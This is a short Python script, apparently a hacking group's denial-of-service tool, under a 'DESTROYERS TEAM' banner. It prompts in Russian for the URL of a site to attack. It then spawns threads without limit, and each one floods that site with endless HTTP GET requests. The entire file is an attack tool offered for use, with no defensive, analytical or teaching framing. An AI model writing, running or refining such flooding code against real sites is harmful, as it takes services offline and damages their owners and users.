import threading
import requests
import random	# For Random source port
import time

print("🅳🅴🆂🆃🆁🅾🆈🅴🆁🆂 🆃🅴🅰🅼")

targ = input("Введите ссылку на сайт для атаки: ")

def dos():
 while True:
  requests.get(targ)
  print("[+] Заход на сайт выполнен!")
  
while True:
 threading.Thread(target=dos).start()
